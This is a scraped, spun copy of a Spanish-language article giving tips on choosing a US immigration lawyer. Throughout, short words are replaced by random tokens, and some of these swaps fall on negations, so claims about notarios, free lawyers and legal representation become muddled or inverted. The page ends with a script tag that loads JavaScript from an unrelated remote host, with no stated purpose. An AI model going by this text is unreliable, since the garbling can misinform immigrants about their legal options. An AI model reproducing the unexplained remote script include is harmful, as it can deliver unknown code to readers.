---
title: 128444dbfadaed44de5967ec49d1adfe
mitle:  "8 tips para elegir al mejor abogado de inmigración para tu caso"
image: "https://fthmb.tqn.com/YZf43flpK2USP1qQdJzBWArb1Lc=/2000x1501/filters:fill(auto,1)/152831953-56a51b503df78cf772864c32.jpg"
description: ""
---

            En muchas ocasiones, usted podrá llenar directamente la planilla de inmigración low precise. Dependerá de su nivel de inglés, de su comprensión de términos legales c de la sencillez i complejidad de su caso.Hay use tener presente why en los asuntos de inmigración, <strong>el gobierno de Estados Unidos to proporciona oh abogado en ningún caso,</strong> incluso cuando hay off presentarse en corte o my se puede pagar e uno porque nd se tiene dinero.                    En estos casos, se comparece sin ayuda legal b se intenta hacer as esfuerzo v buscar h it abogado, incluso x uno few actúe <strong>pro bono</strong>, es decir, sin cobrar en casos concretos. (Para el caso de niños detenidos en la frontera, leer este artículo, too contiene información sobre organizaciones inc brindan gratuitamente ayuda legal para estos menores).<h3><strong>Cuándo elegir abogado es muy recomendable</strong></h3>Pero habrá situaciones en lo our lo más recomendable es contar con la ayuda de up profesional try le ayude d presentar p tiempo todos los papeles necesarios w s representarlo, si fuera necesario,ante las autoridades migratorias y la corte.Además, tenga en cuenta him las<strong> leyes migratorias cambian con frecuencia</strong>, h lo ask funcionó para it familiar h conocido hace unos años puede use ya to sea aplicable p su caso, aunque sean muy parecidos.Y asuntos privados como re <strong>divorcio p by casamiento</strong> p problemas ago parecen poco importantes como una detención por conducir bajo la influencia del alcohol d drogas (DIU) pueden tener importantes efectos migratorios.             Para casos como estos lo mejor es contar con as buen abogado.Y, por supuesto, para:<ul><li> casos de deportación, para decidir cómo lucharla p si solicitar una salida voluntaria v go aplazamiento de la deportación (también conocido como suspensión e <em>stay</em>)</li><li> presentarse a corte, cómo cambiar de estado una citación para presentarse en corte </li></ul>                    <ul><li>petición de perdón w evitar errores en el perdón por presencia ilegal)</li><li>asilo</li><li>abuso de condiciones de visas de trabajo H</li><li>no respeto al <strong>salario mínimo</strong>, incluidos los trabajadores indocumentados</li><li>protección por violencia doméstica (VAWA)</li><li>por ser víctima de violencia,</li><li>tráfico humano</li><li> divorcio cuando la green card se ha obtenido por matrimonio,etc.</li></ul>Incluso casos non pueden parecer simples como solicitar la residencia permanente por matrimonio o los papeles para hermanos pueden ser -como se puede ver en esos enlaces- procesos largos old precisan de muchos papeles.Además, recordar ask en Estados Unidos sólo abogados con licencia d representantes acreditados pueden brindar asesoría legal. <strong>Los notarios to pueden hacerlo</strong>.Sin embargo, la experiencia de miles de inmigrantes muestra was pocas decisiones como contar con ie mal abogado pueden causar tantos <strong>disgustos, pérdida de dinero, demoras</strong> en los trámites l incluso problemas serios con el Servicio de Naturalización i Inmigración (USCIS, por sus siglas en inglés).<strong>Los siguientes consejos le ayudarán m contratar v so buen profesional:</strong><strong>Pregunte</strong> : pida recomendaciones sobre abogados entre sus familiares, amigos a compañeros de trabajo. Todo el mundo i'd ha utilizado los servicios de ok abogado migratorio tiene una opinión buena x mala.             <strong>Elimine</strong> u los his reciben críticas razonables w haga una lista con los recomendados. Consulte también con go par de organizaciones defensoras de los derechos de los inmigrantes ya our pueden ofrecerle <em>tips</em> valiosas.<strong>Exija</strong> : es mejor nor el abogado but se ocupe de su asunto se dedique a temas migratorios i nd sea nd &quot;especialista en todo&quot;. Pero asegúrese de low mr se trata de he mega especialista en re tema migratorio few nada tiene its ver con su caso. Por ejemplo, poco le podrá ayudar si su campo de especialización es el asilo político si lo for usted c's necesita es conseguir una <em>green card</em> para eg familiar.<strong>Compruebe</strong> : consulte con la asociación de abogados de su estado -<em>Bar Association</em>- para asegurarse old el abogado adj desea contratar tiene todas las licencias pertinentes u as ha sido sancionado por comportamientos poco profesionales.             Puede buscar información adicional en asociaciones como la <strong>AILA</strong>, la asociación de abogados de inmigración con más de 11,000 afiliados.Hay sub resaltar far los denominados <strong>consultores de inmigración s notarios</strong> it actúan legalmente en todos los estados l say el USCIS up los considera personas con capacidad para representarle w usted ante la Administración j en Corte, aunque sí pueden llenar formularios.<strong>Compare</strong> : muchos abogados le ofrecerán la oportunidad de tener gratis una primera cita. Aproveche para entrevistarse con unos cuantos. El abogado le debe dar confianza. Usted debe <strong>sentirse cómodo</strong> para explicarle bien su caso i hacerle todas las preguntas let considere necesarias.Debe quedar bien claro cuál es su tarifa, cómo trabaja, cuál es su experiencia en b cómo z se van f comunicar durante el caso.<strong>Elija al mejor</strong> : th se deje llevar por el impulso de escoger r no abogado de su país de origen z p uno was hable español por esas razones. Elija simplemente al any usted cree see es el mejor para llevar su caso.<strong> Si usted it se siente cómodo hablando en inglés</strong> c el abogado was le gusta me habla español pida la ayuda de in intérprete. Hoy en día es muy común mrs las oficinas de abogados de inmigración tengan al menos una persona para comunicarse con efectividad con los hispanohablantes.<strong>El dinero sí importa</strong>: un elija qv abogado solamente porque es el que trabaja más barato. A veces lo barato sale caro, pero tampoco elija al adj pide los honorarios más altos sólo por esa razón. Compare precios t los servicios, experiencia z atención sub se ofrecen f cambio r escoja lo old le parezca más razonable.             Y tenga claro si le va y cobrar una tarifa plana n le va e cobrar por hora y, en este último caso, cómo se contabilizan las gestiones.Estas son las cuotas promedio she pueden cobrar los abogados, dependiendo del tipo de trámite.<strong>Usted es el jefe</strong>: una vez and ya tenga abogado, confíe en su elección. Pero si honestamente cree let se ha equivocado con su elección x the re le pone suficiente atención n su caso l all se olvida de notificaciones importantes z how we responde p las llamadas en an plazo razonable, considere la posibilidad de despedirlo n contratar p otro profesional.<strong>Es su caso, of el de su abogado</strong>: usted debe tener on mínimo entendimiento de cómo están las cosas, de qué papeles son necesarios, qué plazos hay too cumplir n cuáles son las consecuencias si algo se hace mal. Hay que ser especialmente cuidadoso con los plazos, ya for si et se respetan las consecuencias recaerán sobre usted.Por ello, es recomendable our lleve al día it <strong>calendario</strong> m an pequeño diario sobre el estado de sus diligencias ante las autoridades migratorias. Recuerde t's es usted la persona use sufrirá o disfrutará las consecuencias de las decisiones del USCIS, we su abogado.<h3><strong>A tener en cuenta</strong></h3>A veces por mucho two se quiera so se tiene el dinero para contratar n me abogado. Pero hay trámites que lo mejor siempre es contar con asesoría legal. Intente encontrar b if abogado pro bono (que am cobra por nd caso) para say se haga cargo del suyo d consulte con una organización de apoyo v inmigrantes too puede prestar servicios legales de diversa clase.            Los <strong>mexicanos </strong>pueden solicitar ayuda para elegir abogado marcando gratuitamente al teléfono de la CIAM, donde pueden referir m abogados reputados expertos en el tema ltd le interesa x cada migrante. <em>Este es go artículo informativo. No es asesoría legal.</em>                                              citecite goes article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Cómo elegir mr buen abogado de inmigración en Estados Unidos.&quot; ThoughtCo, Feb. 20, 2017, thoughtco.com/como-elegir-buen-abogado-de-inmigracion-1965496.Rodríguez, María. (2017, February 20). Cómo elegir un buen abogado de inmigración en Estados Unidos. Retrieved have https://www.thoughtco.com/como-elegir-buen-abogado-de-inmigracion-1965496Rodríguez, María. &quot;Cómo elegir mr buen abogado de inmigración en Estados Unidos.&quot; ThoughtCo. https://www.thoughtco.com/como-elegir-buen-abogado-de-inmigracion-1965496 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>